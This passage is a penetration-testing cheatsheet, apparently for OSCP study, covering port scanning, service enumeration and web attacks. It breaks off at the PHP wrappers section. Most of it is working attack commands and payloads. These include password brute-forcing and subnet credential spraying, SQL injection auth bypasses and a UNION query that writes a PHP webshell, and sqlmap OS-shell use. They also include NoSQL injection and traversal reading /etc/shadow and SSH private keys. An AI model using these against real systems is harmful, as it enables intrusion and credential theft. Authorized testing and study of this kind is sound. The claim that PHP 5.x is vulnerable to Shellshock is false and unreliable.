This cheatsheet contains commands and short scripts that accomplish useful things for penetration testing/red teaming.

Other great cheatsheets:
- [HackTricks](https://book.hacktricks.xyz/)
- [Red Team Experiments](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
- [Awesome Penetration Testing](https://github.com/enaqx/awesome-pentest)

# 1 Scanning

## 1.1 Rustscan

Rustscan is a faster way to discover all open ports and autorun nmap to do the
script scanning on those ports.

```sh
VICTIM_IP=VICTIM_IP
sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -Pn -sV --script "default,safe,vuln" -oA tcp-all
```

## 1.2 Nmap

If using scripts, you can get script help by `nmap --script-help="nfs-*"`.

```sh
# fast full TCP discovery using massscan:
sudo masscan -p1-65535 --rate=1000 -e tun0 $VICTIM_IP | tee masscan.txt
ports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
sudo nmap -v -n -p $ports -oA nmap/tcp-all -Pn --script "default,safe,vuln" -sV $VICTIM_IP

# all TCP ports, fast discovery, then script scan:
# verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -n -v -sC -sV -Pn -p $ports -oA nmap/tcp-all $VICTIM_IP

# UDP fast scan (top 100)
sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast $VICTIM_IP
# top 20 UDP ports
sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 $VICTIM_IP

# specifying safe and wildcard ftp-* scripts
# logic: and, or, not all work. "," is like "or"
nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP

# to get help on scripts:
nmap --script-help="ftp-*"
```

Nmap Services file lists most common ports by frequency:

```sh
cat /usr/share/nmap/nmap-services
```

The nmap scripts are found in the directory `/usr/share/nmap/scripts`.

If you add a script to that directory (that you download from the internet, for example), then you must update the `script.db` by running:

```sh
sudo nmap --script-updatedb
```



## 1.3 Nessus

First, manually install Nessus on Kali from the `.deb` file. It's not in the `apt` repo.

[Installation Instructions](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux)

```sh
# ensure Nessus is started
sudo systemctl start nessusd.service
```

Browse to **https://127.0.0.1:8834** and accept the self-signed SSL cert. Set up free Nessus Essentials license and complete setup prompts. Also create an admin username and password.

Create a New Scan, and navigate the GUI to configure it. The major scan templates are grouped under Discover, Vulnerability, and Compliance.

Nessus is slow and not allowed on the OSCP exam, so this is mostly just for awareness.



## 1.4 Windows Port Scanning

This is a way to live off the land in Windows and perform a port scan.

```powershell
# perform full TCP connection to test if port open
Test-NetConnection -Port 445 $VICTIM_IP

# scanning multiple ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null

# limited ports to search
22,25,80,135,139,445,1443,3306,3389,5432 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null
```

## 1.5 Bash Ping Scanner

Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.

```sh
#!/bin/bash
addr=${1:-10.1.1.0}
subnet="${addr%.*}"
for i in {1..254}; do
  host="$subnet.$i"
  ping -c1 -w1 $subnet.$i >& /dev/null && echo "$host UP ++++" || echo "$host down" &
  sleep 0.1 || break  # lets you Ctrl+C out of loop
done
wait $(jobs -rp)
echo "Done"
```

And here's a one-liner to do it in Windows:

```powershell
# note: meant to be copy-pasted, not in .bat script (%i vs %%i)
for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr "Reply"
```

## 1.6 Bash Port Scanner

Scans all 65535 ports of a single host. Provide host IP as arg. Only works on Linux systems using bash!

```sh
#!/bin/bash
host=${1}
for port in {1..65535}; do
  timeout .5 bash -c "(echo -n > /dev/tcp/$host/$port) >& /dev/null" &&
    echo "port $port is open" &
done
wait $(jobs -rp)
echo "Done"
```

## 1.7 IPv6 to bypass IPv4 filters

Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.

```bash
# First take note of MAC address from nmap scan of device with 'filtered' port.
# NOTE: nmap must be run as sudo to get MAC address.
# If you don't have the MAC from nmap, you can probably get it from
# your arp table with `arp -an`. If you have a hostname, you can
# do a DNS lookup for the AAAA record.

# get list of IPv6 neighbors on tun0 interface
ping6 -c2 ff02::1%tun0 >/dev/null
ip -6 n | grep -i MACADDR

# Then rescan using nmap's IPv6 mode
sudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR
```

Here is another example of a script to try to get the link-local IPv6 address by building the EUI format from the MAC:

```bash
#!/bin/bash -e
# Usage: ./ipv4to6.sh 192.168.0.1
# source: https://askubuntu.com/a/771914

IP=$1
ping -c 1 $1 > /dev/null 2> /dev/null
MAC=$(arp -an $1 | awk '{ print $4 }')
IFACE=$(arp -an $1 | awk '{ print $7 }')

python3 -c "
from netaddr import IPAddress
from netaddr.eui import EUI
mac = EUI(\"$MAC\")
ip = mac.ipv6(IPAddress('fe80::'))
print('{ip}%{iface}'.format(ip=ip, iface=\"$IFACE\"))"
```


## 1.8 Whois

Perform `whois` lookups to get information about a domain name, such as the name server and registrar.

```sh
whois megacorpone.com

# optionally specify server to use for whois lookup
whois megacorpone.com -h $WHOIS_SERVER

# perform a reverse lookup
whois 38.100.193.70
```


# 2 Services

This section includes enumeration, exploitation, and interaction techniques for common services you might discover through scanning.



## 2.1 FTP - 21

**Anonymous Logins:**

These are checked by default with Nmap.

- anonymous : anonymous
- anonymous :
- ftp : ftp


**Bruteforce logins**:

```sh
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://VICTIM_IP
hydra -P /usr/share/wordlists/rockyou.txt -l USER ftp://VICTIM_IP
hydra -V -f -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -l USERNAME ftp://VICTIM_IP
```


**Connecting & Interaction:**

```sh
# ways to connect, in order of preference
ftp -A VICTIM_IP # '-A' forces active mode (not passive)
nc -nvC VICTIM_IP 21
telnet VICTIM_IP 21

# connect in your filesystem explorer:
# (Chrome and Firefox removed FTP support)
ftp://anonymous:anonymous@VICTIM_IP

# interaction using the 'ftp' app
ftp> anonymous # username
ftp> anonymous # password
ftp> help # show list of supported commands
ftp> help CMD # show command-specific help
ftp> binary # set transmission to binary instead of ascii
ftp> ascii # set transmission to ascii instead of binary
ftp> ls -a # list all files (even hidden) (yes, they could be hidden)
ftp> cd DIR # change remote directory
ftp> lcd DIR # change local directory
ftp> pwd # print working directory
ftp> cdup  # change to remote parent directory
ftp> mkdir DIR # create directory
ftp> get FILE [NEWNAME] # download file to kali [and save as NEWNAME]
ftp> mget FILE1 FILE2 ... # get multiple files
ftp> put FILE [NEWNAME] # upload local file to FTP server [and save as NEWNAME]
ftp> mput FILE1 FILE2 ... # put multiple files
ftp> rename OLD NEW # rename remote file
ftp> delete FILE # delete remote file
ftp> mdelete FILE1 FILE2 ... # multiple delete remote files
ftp> mdelete *.txt # delete multiple files matching glob pattern
ftp> bye # exit, quit - all exit ftp connection

# interaction with netcat/telnet:
USER anonymous
PASS anonymous
TYPE i # set transmission type to binary instead of ascii
TYPE a # set transmission type to ascii
LIST # list files
RETR FILE # get file
STOR FILE # put file, overwriting existing
STOU FILE # put file, don't overwrite existing
APPE FILE # put file, appending to existing
CWD DIR # change remote working directory
DELE FILE # delete file
QUIT # exit
```


**Batch Download (all files)**:

```sh
# '-m' mirrors the site, downloading all files
wget -m ftp://anonymous:anonymous@VICTIM_IP
wget -m --no-passive ftp://anonymous:anonymous@VICTIM_IP
```


**Config Files:**

Check `/etc` folder.

```ftpusers
ftpusers
ftp.conf
proftpd.conf
vsftpd.conf
```

If the FTP server supports the PORT command, you can abuse it to scan other hosts via the [FTP Bounce Attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp#ftpbounce-attack). Nmap checks for this by default.



## 2.2 SSH/SFTP - 22

Secure Shell (SSH) and Secure File Transfer Protocol (SFTP).

For extremely old versions, check `searchsploit` for vulns. Otherwise, brute-force and user enumeration are usually all you get out of it.

Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh) for executing commands with misconfigured SFTP user.

### 2.2.1 SSH Credential Bruteforcing

```sh
# using hydra
# '-s PORT' contact service on non-default port
hydra -V -f -l username -P wordlist.txt -s 2222 ssh://$VICTIM_IP

# spray creds to entire subnet to see if they work on other boxes, too!
hydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh

# using patator: useful when services (e.g. ssh) are too old for hydra to work
patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

ncrack -p 22 --user root -P passwords.txt [-T 5] $VICTIM_IP
medusa -u root -P 500-worst-passwords.txt -M ssh -h $VICTIM_IP
```

### 2.2.2 Disable SSH Host Key Checking

Put this at the top of your `~/.ssh/config` to disable it for all hosts:

```
Host *
   StrictHostKeyChecking no
   UserKnownHostsFile /dev/null
```

or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`

### 2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH

If you try to ssh onto a host and get an error like:

```
Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

You can get around this by adding the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.

You can also specify the `KexAlgorithms` variable in the ssh-config file.

Similarly, if you get an error like:

```
Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc
```

You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.


## 2.3 SMTP/s - 25,465,587

```sh
# Banner grab, command/user enum
nc -nvC $VICTIM_IP 25  # "-C" forces sending \r\n line ending, required by smtp
telnet $VICTIM_IP 25  # alternate method, does \r\n by default
# SMTPS
openssl s_client -crlf -connect $VICTIM_IP:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect $VICTIM_IP:587

# on telnet/nc connection, try enumerating users manually via:
EXPN  # get mailing list
VRFY root  # check if you can use VRFY to enumerate users

# basic enumeration
nmap -n -v -p25 --script="smtp-* and safe" -oA nmap/smtp $VICTIM_IP

# enumerate users
nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users $VICTIM_IP
# smtp-user-enum lets you check specific usernames, add a domain, and
# specify the mode (EXPN, VRFY, RCPT) for validation
smtp-user-enum -M MODE -U users.txt -D DOMAIN -t $VICTIM_IP
```

Enabling Telnet client on Windows (to allow SMTP interaction, requires Admin rights):

```bat
dism /online /Enable-Feature /FeatureName:TelnetClient
```

Other ideas:
- send email to user (client-side exploit)
- send email to invalid address, get DSN report (info leaks?)

**Sending email via cmdline:**

```sh
# first create attachment and body files

# then send email with swaks
swaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server SMTP_SERVER --body @body.txt --header "Subject: Need help" --suppress-data -ap

# another option is the sendemail tool:
sendemail -f sender@example.com -t receiver@example.com -u "Subject text" -m "Message body text." -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]
```

See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)



## 2.4 DNS - 53

**PRO TIP**: Make sure you add the DNS entries you discover to your
`/etc/hosts` file. Some web servers do redirection based on domain name!

**Format of `/etc/hosts` entry with multiple subdomains**:

```
10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com
```

**General Purpose Enumeration**:

```sh
# dnsenum does full recon, including attempting zone transfers and bruteforcing
# specify "--noreverse" to avoid reverse-IP lookups
dnsenum domain.tld

# can also use dnsrecon, but takes a little more work to specify full enumeration
dnsrecon -a -s -b -y -k -w -d domain.tld

# fierce does a more abbreviated full-enumeration (good for preliminary look)
fierce --domain domain.tld

# dig zone xfer, note "@" before nameserver
dig @ns1.domain.tld -t axfr domain.tld

# get DNS records by type (MX in this case)
host -t MX example.com
```

DNS Queries on Windows:

```powershell
nslookup www.example.com

# Advanced, specify record type and nameserver
nslookup -type=TXT www.example.com ns1.nameserver.com
```

**Common record types**:

- `NS`: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- `A`: Also known as a host record, the "A record" contains the IP address of a hostname (such as www.example.com).
- `MX`: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- `PTR`: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- `CNAME`: Canonical Name Records are used to create aliases for other host records.
- `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

### 2.4.1 DNS Zone Transfer

This is basically asking for a copy of all DNS entries served by an authoritative server.
It lets you get a list of other subdomains that might be of interest.
If a server is configured properly, it won't give you this info.

```sh
# using dnsrecon
dnsrecon -t axfr -d domain.tld

# using dig, note "@" before nameserver
dig @ns1.nameserver.tld axfr domain.tld

# using host (order of args matters)
host -l domain.tld ns1.nameserver.tld
```

### 2.4.2 Bruteforcing DNS Records

```sh
# using dnsrecon
dnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld

# specifying a file with dnsenum, also performs normal full enum
dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld

# using nmap dns-brute script
nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld

# scan through list of subdomains/hostnames using just bash
for subdomain in $(cat list.txt); do host $subdomain.example.com; done

# scan through IP space doing reverse DNS lookups
for oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v "not found"
```



## 2.5 Finger - 79

If the `finger` service is running, it is possible to enumerate usernames.

```sh
nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP
```



## 2.6 HTTP(s) - 80,443

Scans to run every time:

```bash
# enumerate version info of tech stack, find emails, domains, etc.
whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
# to passively accomplish the same thing on a real site, use https://www.wappalyzer.com/

# Gobuster directory/file discovery
# Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,
ulimit -n 8192 # prevent file access error during scanning
gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php" -o gobuster-common.txt -u http://$VICTIM_IP

# look for common vulns with nikto
# -C all means scan all cgi-dirs
nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
```

Checklist:

- [ ] Check `searchsploit` for vulns in server software, web stack
- [ ] Check `/robots.txt` and `/sitemap.xml` for directories/files of interest
- [ ] Inspect HTML comments/source for juicy info
  - [ ] secrets/passwords
  - [ ] directories of interest
  - [ ] software libraries in use
- [ ] Inspect SSL certs for DNS subdomains and emails
- [ ] Watch out for [Apache virtual hosts](https://httpd.apache.org/docs/current/vhosts/%7CApache%20virtual%20hosts.md) (and nginx/IIS/etc. equivalents)! Set `/etc/hosts` with ALL (sub)domains for the target IP.
- [ ] Attempt login with default/common creds
- [ ] Attempt login auth bypass (SQLi): `' or 1=1 -- #`
- [ ] Test for [SQL/NoSQL Injection](#3.5.3%20SQL%20Injection) using "bad" chars: `'")}$%%;\`
- [ ] Test for [Command Injection](#3.5.6%20Command%20Injection)
  - [ ] separator characters: `; | & || &&`
  - [ ] quoted context escape: `" '`
  - [ ] UNIX subshells: `$(cmd)`, `>(cmd)` and backticks
- [ ] Test for [Path Traversal](#3.5.4%20Directory%20Traversal) in URL query and (arbitrary?) file upload
- [ ] Test for [LFI/RFI](#3.5.5%20LFI/RFI), especially in URL query params
- [ ] Test for [XSS](#3.5.7%20Cross-Site%20Scripting%20(XSS)) on all input fields, URL query params, and HTTP Headers:
  - [ ] Check what remains after filtering applied on input: `'';!--"<XSS>=&{()}`
  - [ ] Try variations of `<script>alert(1)</script>`


### 2.6.1 Web Scanning/Enumeration

Whatweb shows details about tech stacks in use by server, email addresses found, etc.

```sh
whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
# -v  : verbose
# -a3 : agressive scan
# --log-verbose <file> : save scan output to file
# also supports setting Cookies, HTTP BasicAuth, and proxies
```

**:warning: PHP 5.x is vulnerable to Shellshock!** - If you see it listed by whatweb, exploit it!

Web Directory discovery with Gobuster:

```sh
# Gobuster
ulimit -n 8192 # prevent file access error during scanning
gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf" -o gobuster-common.txt -u http://$VICTIM_IP
# -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
# -z / --no-progress = no progress displayed
# -q / --quiet = quiet mode (no banner)
# -r / --follow-redirect
# -k / --no-tls-validation
# -w / --wordlist
# -t / --threads
# -o / --output

# user-agent:
# -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
# other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt

# adding a proxy to gobuster:
# --proxy socks5://127.0.0.1:1080

# you can use patterns with the wordlist to fuzz for API endpoints.
# -p / --pattern <pattern-file>
# where pattern files contain placeholder {GOBUSTER} for substitution in wordlist,
# one pattern per line
# Example:
# {GOBUSTER}/v1
# {GOBUSTER}/v2
```

Web Directory discovery with ffuf (great for scanning through SOCKS proxy):

```bash
# FFUF as a dirbuster through a SOCKS proxy
ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# pretty print json output:
ffuf.json | python -m json.tool
```

Other web discovery tools:

- feroxbuster - fast scanner written in Rust
- dirb
- dirbuster
- wfuzz


Good wordlists to try:
- /usr/share/dirb/wordlists/small.txt
- /usr/share/dirb/wordlists/common.txt
- /usr/share/dirb/wordlists/catala.txt
- /usr/share/dirb/wordlists/big.txt
- /usr/share/dirbuster/wordlists/directory-list-1.0.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt



### 2.6.2 Web Credential Bruteforcing

Get a wordlist and emails from the site using `cewl`:

```sh
# save emails to file, min word length = 5
cewl -e --email_file emails.txt -m 5 -w cewl.txt http://VICTIM_IP
```

Hydra is great for hitting web login forms. To use it, first capture a failed login using Burp. You need that to see how it submits the login request and to see how to identify a failed login.

Hydra help/usage for specific module:

```bash
hydra -U http-post-form
```

Web Forms (POST request):

```bash
# using hydra
# string format "<webform-path>:<username-field>=^USER^&<password-field>=^PASS^:<bad-pass-marker>"
# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
# '-t 69': use 69 threads
# change to https-web-form for port 443
hydra -V -f -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64

# proxy-aware password bruteforcing with ffuf
ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "Username=admin&Password=FUZZ&RememberMe=true" -fw 6719
```

HTTP BasicAuth (GET request):

```bash
# hydra http basic auth brute force
# Use https-get for https
# '-u' loops users before moving onto next password
hydra -u -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC"
```

CSRF Tokens defeat hydra, so use `patator`: (documentation in [`patator.py`](https://github.com/lanjelot/patator/blob/master/patator.py))

```sh
# before_urls visits the login page where the CSRF token is
# before_egrep uses regex to extract the CSRF token
# bug in reslover means you have to tell it to resolve IP to itself
# use `--debug --threads=1 proxy=127.0.0.1:8080 proxy_type=http` for troubleshooting with burp and debug logging.
patator http_fuzz --threads=10 --max-retries=0 --hits=patator-hits.txt method=POST follow=1 accept_cookie=1 timeout=5 auto_urlencode=1 resolve=VICTIM_IP:VICTIM_IP url="http://VICTIM_IP/login" body='csrf_token=__CSRF__&usernameD=FILE0&password=FILE1' 0=users.txt 1=cewl.txt before_urls="http://VICTIM_IP/login" before_egrep='__CSRF__:value="(\w+)" id="login__csrf_token"' -x ignore:fgrep='No match'
```



### 2.6.3 SQL Injection

Tips:
- Test for SQL/NoSQL injection using "bad" chars: `'")}$%%;\`
  - Full list:
    ```
    '
    "
    \
    ;
    `
    )
    }
    --
    #
    /*
    //
    $
    %
    %%
    ```
- Watch out for apps stripping required trailing whitespace after `--`. Use `-- #` or similar.
- SQL comments:
  - `--` - requires trailing whitespace, widely supported
  - `/*` - multi-line comment, widely supported
  - `#` - MySQL
  - `REM` - Oracle
- When detecting errors due to SQLi, it may not be an obvious error message. Look for pattern changes/missing output to indicate error.

Auth bypass (try both username and password fields):

```
' or 1=1 -- #  <-- MySQL,MSSQL
' || '1'='1' -- #  <-- PostgreSQL
admin' or 1=1 -- #
admin') or (1=1 -- #
```

Extracting data from error messages:

```
' or 1=1 in (select @@version) -- #
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- #
```

Pro tip for `sqlmap`: if you save the GET/POST request of a SQLi attempt in burp,
you can pass that request file to `sqlmap` as a template for it's requests. You
can also pass it the webroot and `--os-shell` args to get it to give you a
webshell:

```sh
sqlmap -r post.txt -p FIELDNAME --os-shell --web-root "/var/www/html/tmp"
```


#### 2.6.3.1 UNION SQLi technique

The UNION SQL injection technique is helpful when the result of the original SQL
query is output/displayed to the user. Using UNION, we can ask for extra data
from the database that wasn't originally intended to be shown to the user (like creds).

For UNION SQLi attacks to work, we first need to satisfy two conditions:
- The injected UNION query has to include the same number of columns as the original query.
- The data types need to be compatible between each column.

First, determine how many columns are in the original query:

```sql
' ORDER BY 1-- #
```

Increment the value using binary search (2, 4, 8,...) until it errors out, then
use binary search to isolate the highest value that does NOT error out. This
is the number of columns in the original query.

Next, (optionally) figure out what column index goes where in your output.

```sql
-- assuming 3 columns from ORDER BY test
' union all select 1,2,3 -- #
```

Alternatively, use enumeration functions in output columns, shifting what goes
where in trial-and-error fashion until you get useful output:

```sql
-- assuming 5 columns from ORDER BY test, shifting enumeration output
' UNION SELECT database(), user(), @@version, null, null -- #
' UNION SELECT null, null, database(), user(), @@version -- #
```

Finally, gather whatever data from the database you desire. Start with understanding the schema:

```sql
-- getting table schema info
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- #
```

Additionally, you can get code execution on MySQL by creating a webshell with SELECT INTO OUTFILE:

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- #
```

This requires file write permissions in the database and on disk.
It may throw an error when executing the query, but
the file can still be written to disk. Check to see.

MySQL and MSSQL have other code execution possibilities as well. Refer to those sections.


#### 2.6.3.2 Blind SQLi

Two types of attack methods: boolean and time-based.
Boolean requires (visible) change in output on success vs. failure.
Time-based uses injected sleep on success to detect it.

Boolean:
Use AND operator to test if pre-condition is true. Base primitive:

```
' and 1=1 -- #
```

Then you build out what you know by brute force. Example: given you know 'admin'
user is in database, you can build query to determine database name one letter
at a time, watching for when 'admin' is in output or not:

```
# database name 'offsec'
admin' and database() like 'o%' and 1=1 -- #  <-- succeeds
admin' and database() like 'p%' and 1=1 -- #  <-- fails

# more complex, using binary search for ascii values at each position
admin' and substr(database(),2,1)<'f' and 1=1 -- #
```

Time-based:
Inject sleep call after AND operator that tests if condition is true. Base primitive, causing 3 second sleep on success:

```
' AND IF (1=1, sleep(3),'false') -- #
```

Example (using time utility helps measure difference):

```sh
# success is slow (offsec user found in lookup)
❯ time curl -s "http://192.168.201.16/blindsqli.php?user=$(urlencode "offsec' AND IF (1=1, sleep(1),'false') -- #")" &> /dev/null
curl -s  &> /dev/null  0.02s user 0.00s system 1% cpu 2.258 total
#                                                     ^^^^^

# failure is fast
❯ time curl -s "http://192.168.201.16/blindsqli.php?user=$(urlencode "NOPE' AND IF (1=1, sleep(1),'false') -- #")" &> /dev/null
curl -s  &> /dev/null  0.01s user 0.01s system 14% cpu 0.180 total
#                                                      ^^^^^
```



#### 2.6.3.3 Exploiting NoSQL Injection

In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:

```
http://example.com/search?username=admin&password[$ne]=derp

# other short examples:
password[$regex]=.*
password[$exists]=true
```

In POST body (JSON):

```json
{"username": "admin", "password": {"$ne": null} }

// other examples
{"username": "admin", "password": {"$gt": undefined} }
```

SQL vs Mongo injection:

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00

/?search=admin' && this.password//+%00 --> Check if the field password exists
/?search=admin' && this.password.match(/.*/)//+%00 --> Start matching password
/?search=admin' && this.password.match(/^p.*$/)//+%00
/?search=admin' && this.password.match(/^pa.*$/)//+%00
```

Extracting length information:

```
username=admin&password[$regex]=.{1}
username=admin&password[$regex]=.{3}
# True if the length equals 1,3...
```

Building password:

```
username=admin&password[$regex]=p.*
username=admin&password[$regex]=pa.*
username=admin&password[$regex]=pas.*
username=admin&password[$regex]=pass.*
...
# in JSON
{"username": "admin", "password": {"$regex": "^p" }}
{"username": "admin", "password": {"$regex": "^pa" }}
{"username": "admin", "password": {"$regex": "^pas" }}
...
```




### 2.6.4 Directory Traversal

On Linux, `/var/www/html/` is commonly the webroot. Other Linux options: `/usr/share/nginx/www` or `/usr/share/nginx/html`.

On Windows IIS, it's `C:\inetpub\wwwroot\`. For Windows XAMPP, it's `C:\xampp\htdocs\`

Sometimes you can read [sensitive files](#sensitive-files) by changing the URL query params to point
to a file using the relative path.

Example:

```
https://example.com/cms/login.php?language=en.html
```

Here, `en.html` appears to be a file in the `/cms/` directory under the webroot.
We can try changing `en.html` to `../../../../etc/passwd` to see if it lets us
view the file.

Things to try when testing for traversal vuln:
- Add extra `../` to ensure you make it all the way to the filesystem root.
- Use backslashes (`\`) instead of forward slashes (`/`), especially on Windows.
- URL encode the `../` -> `%2E%2E%2F` to bypass filters
- Double-encode the `../` -> `%252E%252E%252F`; IIS 5.0 and earlier
- UTF-8 encode the `../` -> `%C0%AE%C0%AE%2F` (`%c0%ae` is `.`); [cve-2022-1744][cve-2022-1744]{:target="_blank"}
- Use `....//` instead of `../` to bypass filters
- Append null byte (`%00`) if you suspect file extension is getting added
- Check out [DotDotPwn](https://github.com/wireghoul/dotdotpwn) fuzzing tool.

[cve-2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744


When using `curl` to test, you may need to include the `--path-as-is` flag:

```sh
curl --path-as-is http://localhost/?page=/../../../../etc/passwd
```


**Files to try:**
- `/etc/passwd`
- `/etc/shadow` if permissions allow
- `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
- `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
	- also `id_dsa`, `id_ecdsa`, and `id_ed25519`
- other [sensitive files](#7.1%20Sensitive%20Files)

The `proc` filesystem has useful info for enumerating the host:

```
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug  # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/[0-9]*/fd/[0-9]*  # (first number is the PID, second is the file descriptor)
```

If there is arbitrary file upload (allows directory traversal), you may be able
to use it to (over)write arbitrary files, which may help you get code execution.
Try:
- uploading a webshell to the webroot folder
- adding your ssh key to the `authorized_keys` file



### 2.6.5 LFI/RFI

Local File Inclusion is basically code execution that requires directory traversal.
LFI/RFI can be leveraged with PHP (`.php`, most common), Perl (`.pl`), Active
Server Pages (`.asp`), Active Server Pages Extended (`.aspx`), Java Server
Pages (`.jsp`), and even (rarely) Node.js.

If there is a file upload vulnerability, you can also combine LFI with that to
get code execution.

File Upload filter bypasses:
- change file extension to `.phps` or `.php7`
- make file extension mixed uppercase and lowercase

You can get code execution by poisoning local files, including log files and
PHP session files with PHP code. Access logs typically have User-Agent in them,
which we can use to inject malicious PHP code.

Common log and PHP session file locations:

- `/var/log/apache2/access.log` - Debian/Ubuntu
- `/var/log/apache2/access.log` - RHEL/CentOS/Fedora
- `/var/log/httpd-access.log` - FreeBSD
- `C:\xampp\apache\logs\access.log` - Windows w/ XAMPP
- `C:\Program Files\Apache Group\Apache\logs\access.log`
- `C:\inetpub\logs\LogFiles\W3SVC1\` and `\HTTPERR\` - Windows IIS
- `/etc/httpd/logs/acces_log` and `/error_log`
- `/var/www/logs/access_log` and `/error_log`
- `/var/www/logs/access.log` and `/error.log`
- `C:\Windows\Temp`
- `/tmp/`
- `/var/lib/php/session`
- `/var/lib/php[4567]/session`
- `C:\php\sessions\`
- `C:\php[4567]\sessions\`

Default session filename: `sess_<SESSION_ID>`
(grab SESSION_ID from your cookies in the browser)

**Look for [sensitive files](#sensitive-files) if you have LFI!**

For RFI, the `allow_url_include` must be enabled in PHP apps.


#### 2.6.5.1 PHP Wrappers

[PHP Wrappers](https://www.php.net/manual/en/wrappers.php) are useful for filter
evasion, for grabbing file contents without it getting executed, and even for
code execution.

